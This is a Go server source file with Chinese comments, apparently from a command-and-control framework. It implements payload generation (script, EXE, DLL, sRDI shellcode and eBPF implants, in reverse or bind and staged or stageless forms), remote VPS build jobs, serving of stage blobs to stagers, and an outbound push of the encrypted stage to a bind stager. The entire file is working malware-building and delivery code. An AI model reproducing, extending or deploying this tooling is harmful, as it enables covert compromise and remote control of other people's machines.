package server

// 载荷 v3 API(契约 C2_CONTRACTS.md §19,Agent P 所有)。
//
// 本文件承接自 c2_api.go 的 POST /api/c2/payloads(迁移:原 handler 删除、路由注册
// 与 handler 名不变,GET list/download/delete 留在 c2_api.go)。v3 语义:
//   - 生成入参扩展 {artifact, direction, staged, bind_port?, build_vps_machine_id?};
//   - 合法组合校验(c2center.ValidatePayloadCombo,契约 §19 表逐字)+ 目标平台/协议
//     支持面/bind 端口校验,非法组合 400 带人话原因;
//   - artifact=script → 一期 RenderPayload 同步路径(c2GeneratePayload 原样复用),
//     201 返回;补填三期三列;
//   - exe/dll/shellcode/ebpf → 建 c2_jobs(kind=build) 异步(二期 job 管线复用;
//     入参 JSON 存 artifact/direction/staged),202 返回;dll/shellcode/ebpf 与
//     staged 必须给 build_vps_machine_id;exe 不给机器 = 只出源码 zip(一期行为);
//   - staged:交付物是极简 stager 源码;完整 stage 源码另存
//     payloads/stage_<id>_src.zip,由构建 runner 先构建 stage、注册 blob
//     payloads/stage_<id>.bin,再构建 stager(契约 §19 顺序)。
//
// staged 信道平台侧(与 Agent T 的对接面):
//   - reverse:stager POST /e 发 t=stage_get,处理核(Agent T 的 listener.go
//     processStageGet)经 Manager.StageDataOpener 回调取分片——注入点:
//     mgr.StageDataOpener = s.c2StageDataFor(c2_center.go 集成阶段一行,见该文件尾注);
//   - bind:stager 在目标机监听,平台经 c2PushStageToBindStager(用 §18 冻结签名
//     NewOutboundConn)主动连入,按帧应答 stage_data(不走处理核——帧式连接首帧
//     必须 reg 的规则属于会话信道,stager 不是会话)。
//
// 【文件名纪律】stage blob/stage 源码命名为 stage_<id>.bin / stage_<id>_src.zip
// (前缀 "stage_"),刻意避开 c2center.readPayloadFile 的 <id>_ 前缀匹配模式,
// 防止 stager 载荷投递端点错发 stage blob。清理时机随载荷删除(见最终报告)。

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	c2center "github.com/Autumn-27/artex/c2center"
	pgdb "github.com/Autumn-27/artex/db"
)

// c2BuildJobInput 是构建作业 c2_jobs.input 的载荷矩阵部分(重试/恢复按它重建)。
type c2BuildJobInput struct {
	PayloadID int64  `json:"payload_id"`
	Source    string `json:"source"`
	// 载荷矩阵(§19)。
	Artifact      string `json:"artifact"`
	Direction     string `json:"direction"`
	Staged        bool   `json:"staged"`
	StageArtifact string `json:"stage_artifact,omitempty"` // staged 时 stage 的形态 exe|dll
	BindPort      int    `json:"bind_port,omitempty"`
}

// createC2Payload POST /api/c2/payloads(三期载荷矩阵版;自 c2_api.go 迁入)。
// → 201 {id,oneliner}(同步路径)/ 202 {id,job_id,oneliner}(构建路径)。
// callback 为空 → 400(先填回调地址);组合非法 → 400 带人话原因。
func (s *Server) createC2Payload(w http.ResponseWriter, r *http.Request) {
	if !s.c2Ready(w) {
		return
	}
	var req struct {
		ListenerID int64  `json:"listener_id"`
		Format     string `json:"format"`
		Target     string `json:"target"`
		Name       string `json:"name"`
		// 三期 §19 载荷矩阵。
		Artifact  string `json:"artifact"`
		Direction string `json:"direction"`
		Staged    bool   `json:"staged"`
		BindPort  int    `json:"bind_port"`
		// 二期 §14(保留):指定则源码包额外经该机器编译出二进制。
		BuildVPSMachineID int64 `json:"build_vps_machine_id"`
	}
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 1<<20)).Decode(&req); err != nil {
		writeErr(w, 400, "invalid JSON: "+err.Error())
		return
	}
	if req.ListenerID <= 0 {
		writeErr(w, 400, "listener_id 必填")
		return
	}

	// ---- 归一化与 v2 兼容映射 ----
	artifact := strings.TrimSpace(req.Artifact)
	if artifact == "" {
		artifact = pgdb.C2PayloadArtifactScript
	}
	direction := strings.TrimSpace(req.Direction)
	if direction == "" {
		direction = pgdb.C2DirectionReverse
	}
	// v2 兼容:旧入参「format=gosrc」不带 artifact → 等价 exe 产物
	//(无构建机器 = 只出源码包,与二期行为逐字一致;有机器 = 建 build 作业)。
	if artifact == pgdb.C2PayloadArtifactScript && req.Format == pgdb.C2PayloadFormatGoSrc {
		artifact = pgdb.C2PayloadArtifactExe
	}
	// 编译型产物格式恒 gosrc(script 携带 gosrc 会被组合表拒绝,见下)。
	switch artifact {
	case pgdb.C2PayloadArtifactExe, pgdb.C2PayloadArtifactDll,
		pgdb.C2PayloadArtifactShellcode, pgdb.C2PayloadArtifactEbpf:
		req.Format = pgdb.C2PayloadFormatGoSrc
	}

	// ---- 组合表/目标平台/协议支持面/bind 端口 ----
	if err := c2center.ValidatePayloadCombo(req.Format, artifact, direction, req.Staged); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if req.Target == "" {
		req.Target = "windows"
	}
	if err := c2center.ValidatePayloadArtifactTarget(req.Target, artifact); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if err := c2center.ValidateBindPort(direction, req.BindPort); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	l, err := s.m.PG().GetC2Listener(req.ListenerID)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if l == nil {
		writeErr(w, 400, fmt.Sprintf("监听器 #%d 不存在", req.ListenerID))
		return
	}
	if err := c2center.ValidateArtifactChannelSupport(artifact, direction, req.Staged, l.Proto); err != nil {
		writeErr(w, 400, err.Error())
		return
	}

	// ---- script:一期同步路径(RenderPayload,契约 §3)----
	if artifact == pgdb.C2PayloadArtifactScript {
		if direction == pgdb.C2DirectionBind {
			// 组合表合法,但 bind 方向的脚本模板由传输框架(Agent T,§18)交付,
			// 一期模板只有 reverse——明确报错,不做静默降级。
			writeErr(w, 400, "script 载荷的 bind(正向)模板待传输框架交付后开放,当前请选 reverse 或 exe/dll 产物")
			return
		}
		pl, _, err := s.c2GeneratePayload(req.ListenerID, req.Format, req.Target, req.Name, "user")
		if err != nil {
			writeErr(w, 400, err.Error())
			return
		}
		if err := s.m.PG().SetC2PayloadMatrix(pl.ID, artifact, direction, req.Staged); err != nil {
			writeErr(w, 500, "载荷已生成但回填矩阵列失败: "+err.Error())
			return
		}
		log.Printf("[c2-center] 载荷 «%s»(#%d) 已生成(%s/%s/%s)", pl.Name, pl.ID, pl.Format, pl.Target, artifact)
		writeJSON(w, 201, map[string]any{"id": pl.ID, "oneliner": pl.Oneliner})
		return
	}

	// ---- 编译型产物(exe/dll/shellcode/ebpf):build 作业异步路径 ----
	needMachine := req.Staged || artifact != pgdb.C2PayloadArtifactExe
	if needMachine && req.BuildVPSMachineID <= 0 {
		writeErr(w, 400, "该产物必须指定 build_vps_machine_id(dll/shellcode/ebpf 与 staged 产物只能经 VPS 构建;exe 可不给机器只出源码包)")
		return
	}
	if req.BuildVPSMachineID > 0 {
		vm, err := s.m.PG().GetVpsMachine(req.BuildVPSMachineID)
		if err != nil {
			writeErr(w, 500, err.Error())
			return
		}
		if vm == nil {
			writeErr(w, 400, fmt.Sprintf("构建机器 #%d 不存在", req.BuildVPSMachineID))
			return
		}
	}

	pl, jobID, err := s.c2GenerateBuildablePayload(req.ListenerID, artifact, direction, req.Target, req.Name, req.Staged, req.BindPort, req.BuildVPSMachineID)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	if jobID <= 0 {
		log.Printf("[c2-center] 载荷 «%s»(#%d) 已生成(%s/%s/%s,仅源码包)", pl.Name, pl.ID, pl.Format, pl.Target, artifact)
		writeJSON(w, 201, map[string]any{"id": pl.ID, "oneliner": pl.Oneliner})
		return
	}
	log.Printf("[c2-center] 载荷 «%s»(#%d) 已生成(%s/%s/%s staged=%v),VPS 构建作业 #%d 已排队",
		pl.Name, pl.ID, pl.Format, pl.Target, artifact, req.Staged, jobID)
	writeJSON(w, 202, map[string]any{"id": pl.ID, "job_id": jobID, "oneliner": pl.Oneliner})
}

// c2GenerateBuildablePayload 编译型产物的生成核心:渲染源码 → 建行(带三期列)→
// 落盘 → (staged 另存 stage 源码)→ 建 build 作业。返回载荷行与作业 id
// (jobID=0 = 未建作业,只出源码包)。
func (s *Server) c2GenerateBuildablePayload(listenerID int64, artifact, direction, target, name string, staged bool, bindPort int, machineID int64) (*pgdb.C2Payload, int64, error) {
	pg := s.m.PG()
	l, err := pg.GetC2Listener(listenerID)
	if err != nil {
		return nil, 0, err
	}
	if l == nil {
		return nil, 0, fmt.Errorf("监听器 #%d 不存在", listenerID)
	}
	// 解封 key(明文只在内存短暂存在,渲染完即弃)。
	sealed, err := pg.GetC2ListenerKey(listenerID)
	if err != nil {
		return nil, 0, err
	}
	key, err := s.openC2Secret(sealed)
	if err != nil {
		return nil, 0, fmt.Errorf("解封监听器密钥失败: %w", err)
	}
	l2 := c2centerListenerFromDB(l)
	token := c2RandomHex(16)

	// stage 产物形态:staged shellcode 的 stage 是 DLL(经 sRDI 转 shellcode 的
	// 是 stager 本身);其余 staged 是 exe。stageless shellcode 的源码走 dll。
	stageArtifact := pgdb.C2PayloadArtifactExe
	if artifact == pgdb.C2PayloadArtifactShellcode {
		stageArtifact = pgdb.C2PayloadArtifactDll
	}

	// 1) 渲染交付物源码(staged = stager;stageless = 完整产物)。
	//    shellcode 的源码是 dll(sRDI 转换对象);ebpf 的源码是 bind beacon(exe,
	//    构建期再拼触发器资产)。
	var src *c2center.MatrixSource
	if staged {
		src, err = c2center.RenderStagerSource(stageArtifact, direction, target, l2, key, token, bindPort)
	} else {
		art := artifact
		switch art {
		case pgdb.C2PayloadArtifactShellcode:
			art = pgdb.C2PayloadArtifactDll
		case pgdb.C2PayloadArtifactEbpf:
			art = pgdb.C2PayloadArtifactExe
		}
		src, err = c2center.RenderArtifactSource(art, direction, target, l2, key, bindPort)
	}
	if err != nil {
		return nil, 0, err
	}
	var zipBytes []byte
	var zerr error
	if src.Zip != nil {
		zipBytes = src.Zip // reverse:直接复用 RenderPayload 的协议感知源码 zip
	} else {
		zipBytes, zerr = c2center.ZipBeaconSource([]byte(src.MainGo), src.BuildMD)
	}
	if zerr != nil {
		return nil, 0, fmt.Errorf("打包源码失败: %w", zerr)
	}

	// 2) 建行(带三期矩阵列)+ 落盘(文件名带数字 id 前缀;失败回滚登记行)。
	if strings.TrimSpace(name) == "" {
		name = fmt.Sprintf("%s-%s-%s", l.Name, artifact, target)
		if staged {
			name += "-staged"
		}
	}
	sum := sha256Hex(zipBytes)
	id, err := pg.CreateC2PayloadV3(pgdb.C2PayloadInput{
		ListenerID: listenerID, Name: name, Format: pgdb.C2PayloadFormatGoSrc, Target: target,
		Token: token, SHA256: sum, Size: int64(len(zipBytes)), CreatedBy: "user",
	}, artifact, direction, staged)
	if err != nil {
		return nil, 0, err
	}
	rollback := func(terr error) (*pgdb.C2Payload, int64, error) {
		_, _ = pg.DeleteC2Payload(id)
		return nil, 0, terr
	}
	path := filepath.Join(c2BlobDir(s.m.dir, "payloads"),
		fmt.Sprintf("%d_%s", id, sanitizeReportFilename(src.Filename)))
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return rollback(fmt.Errorf("建载荷目录失败: %w", err))
	}
	if err := os.WriteFile(path, zipBytes, 0o600); err != nil {
		return rollback(fmt.Errorf("写载荷文件失败: %w", err))
	}
	if err := pg.UpdateC2PayloadFilePath(id, path); err != nil {
		return nil, 0, err
	}

	// 3) staged:另存完整 stage 的源码(构建 runner 先构建 stage 并注册 blob)。
	if staged {
		stageSrc, serr := c2center.RenderArtifactSource(stageArtifact, direction, target, l2, key, bindPort)
		if serr != nil {
			return rollback(fmt.Errorf("渲染 stage 源码失败: %w", serr))
		}
		stageZip, zerr := c2center.ZipBeaconSource([]byte(stageSrc.MainGo), stageSrc.BuildMD)
		if zerr != nil {
			return rollback(fmt.Errorf("打包 stage 源码失败: %w", zerr))
		}
		stagePath := s.c2StageSrcZipPath(id)
		if err := os.MkdirAll(filepath.Dir(stagePath), 0o755); err != nil {
			return rollback(fmt.Errorf("建 stage 目录失败: %w", err))
		}
		if err := os.WriteFile(stagePath, stageZip, 0o600); err != nil {
			return rollback(fmt.Errorf("写 stage 源码失败: %w", err))
		}
	}

	// 4) build 作业(复用二期 job 管线;入参 JSON 存矩阵)。
	jobID := int64(0)
	if machineID > 0 {
		input, _ := json.Marshal(c2BuildJobInput{
			PayloadID: id, Source: "api",
			Artifact: artifact, Direction: direction, Staged: staged,
			StageArtifact: stageArtifact, BindPort: bindPort,
		})
		jid, jerr := pg.CreateC2Job(pgdb.C2JobInput{
			Kind:         pgdb.C2JobKindBuild,
			PayloadID:    id,
			ListenerID:   listenerID,
			VPSMachineID: machineID,
			Input:        input,
		})
		if jerr != nil {
			return nil, 0, fmt.Errorf("载荷已生成但创建构建作业失败: %w", jerr)
		}
		jobID = jid
		go s.runC2BuildJob(jobID) // 事件驱动;崩溃遗留由 initC2Build 恢复
	}

	pl, err := pg.GetC2Payload(id)
	if err != nil {
		return nil, 0, err
	}
	return pl, jobID, nil
}

// c2StageBlobPath 是 staged 载荷的 stage 产物文件(payloads/stage_<id>.bin)。
// 前缀 "stage_" 刻意避开 readPayloadFile 的 <id>_ 匹配(见文件头纪律)。
func (s *Server) c2StageBlobPath(payloadID int64) string {
	return filepath.Join(c2BlobDir(s.m.dir, "payloads"), fmt.Sprintf("stage_%d.bin", payloadID))
}

// c2StageSrcZipPath 是 staged 载荷的 stage 源码包(payloads/stage_<id>_src.zip)。
func (s *Server) c2StageSrcZipPath(payloadID int64) string {
	return filepath.Join(c2BlobDir(s.m.dir, "payloads"), fmt.Sprintf("stage_%d_src.zip", payloadID))
}

// c2StageDataFor 是 Manager.StageDataOpener 的 server 侧实现(staged 信道接线,
// 契约 §19;处理核已按 token 做了存在性/归属与防重放,这里做矩阵白名单与分片):
// 按 token 读 payloads/stage_<id>.bin 的 [offset, offset+length) 分片。
// 错误一律按 404 语义被处理核吞掉(不暴露存在性)。
// 注入:mgr.StageDataOpener = s.c2StageDataFor(c2_center.go 集成阶段一行)。
func (s *Server) c2StageDataFor(token string, offset, length int64) (data []byte, eof bool, total int64, err error) {
	if s.m == nil || s.m.PG() == nil {
		return nil, false, 0, fmt.Errorf("数据库未初始化")
	}
	pl, err := s.m.PG().GetC2PayloadV3ByToken(token)
	if err != nil {
		return nil, false, 0, err
	}
	if pl == nil {
		return nil, false, 0, fmt.Errorf("载荷不存在")
	}
	if !pl.Staged {
		return nil, false, 0, fmt.Errorf("载荷不是 staged 产物")
	}
	switch pl.Artifact {
	case pgdb.C2PayloadArtifactExe, pgdb.C2PayloadArtifactDll, pgdb.C2PayloadArtifactShellcode:
	default:
		return nil, false, 0, fmt.Errorf("产物形态 %q 无 stage", pl.Artifact)
	}
	blob, err := os.ReadFile(s.c2StageBlobPath(pl.ID))
	if err != nil {
		return nil, false, 0, fmt.Errorf("stage blob 不存在")
	}
	if offset < 0 || offset > int64(len(blob)) {
		return nil, false, 0, fmt.Errorf("偏移非法")
	}
	if length <= 0 {
		length = c2center.FileChunkSize
	}
	end := offset + length
	if end > int64(len(blob)) {
		end = int64(len(blob))
	}
	return blob[offset:end], end >= int64(len(blob)), int64(len(blob)), nil
}

// c2PushStageToBindStager(bind+staged 的平台侧 stage 推送,集成钩子):经 §18 冻结
// 签名 NewOutboundConn 主动连入正在监听的 stager,按帧应答 stage_get 直至 EOF。
// 不走处理核(帧式连接首帧必须 reg 的规则属于会话信道;stager 不是会话)。
// 调用时机:页面/agent 对 bind+staged 载荷触发「正向送 stage」;当前由集成阶段接入
// 触发入口,函数本体已按冻结依赖写好(仅依赖 §18 签名与帧语义)。
func (s *Server) c2PushStageToBindStager(payloadID int64, host, port string) error {
	if s.m == nil || s.m.PG() == nil {
		return fmt.Errorf("数据库未初始化")
	}
	mgr := C2Manager()
	if mgr == nil {
		return fmt.Errorf("C2 中心未初始化")
	}
	pg := s.m.PG()
	pl, err := pg.GetC2PayloadV3(payloadID)
	if err != nil {
		return err
	}
	if pl == nil {
		return fmt.Errorf("载荷 #%d 不存在", payloadID)
	}
	if !pl.Staged || pl.Direction != pgdb.C2DirectionBind {
		return fmt.Errorf("载荷 #%d 不是 bind+staged 产物,无正向送 stage 语义", payloadID)
	}
	l, err := pg.GetC2Listener(pl.ListenerID)
	if err != nil {
		return err
	}
	if l == nil {
		return fmt.Errorf("监听器 #%d 不存在", pl.ListenerID)
	}
	sealedKey, err := pg.GetC2ListenerKey(pl.ListenerID)
	if err != nil {
		return err
	}
	key, err := s.openC2Secret(sealedKey)
	if err != nil {
		return fmt.Errorf("解封监听器密钥失败: %w", err)
	}
	conn, err := mgr.NewOutboundConn(c2centerListenerFromDB(l), host, port)
	if err != nil {
		return err
	}
	defer conn.Close() //nolint:errcheck
	for {
		frame, rerr := conn.ReadFrame()
		if rerr != nil {
			return fmt.Errorf("读 stager 帧失败: %w", rerr)
		}
		plain, oerr := c2center.Open(key, frame)
		if oerr != nil {
			return fmt.Errorf("解开 stager 帧失败(密钥/帧格式不符): %w", oerr)
		}
		var env struct {
			Type string          `json:"t"`
			Data json.RawMessage `json:"d"`
		}
		if jerr := json.Unmarshal(plain, &env); jerr != nil || env.Type != c2center.TypeStageGet {
			return fmt.Errorf("stager 首帧不是 stage_get")
		}
		var sg c2center.StageGetPayload
		_ = json.Unmarshal(env.Data, &sg)
		if sg.Token != pl.Token {
			return fmt.Errorf("stager 的 token 与载荷不符")
		}
		data, eof, total, derr := s.c2StageDataFor(pl.Token, sg.Offset, sg.Length)
		if derr != nil {
			return fmt.Errorf("取 stage 分片失败: %w", derr)
		}
		resp, merr := json.Marshal(c2center.ResponseEnvelope{
			Type: c2center.TypeStageData,
			Meta: c2center.RespMeta{SleepSec: 10, JitterPct: 20},
			Data: c2center.StageDataPayload{Data: data, EOF: eof, Total: total},
		})
		if merr != nil {
			return merr
		}
		sealedResp, serr := c2center.Seal(key, resp)
		if serr != nil {
			return serr
		}
		if werr := conn.WriteFrame(sealedResp); werr != nil {
			return fmt.Errorf("写 stage_data 帧失败: %w", werr)
		}
		if eof {
			return nil
		}
	}
}
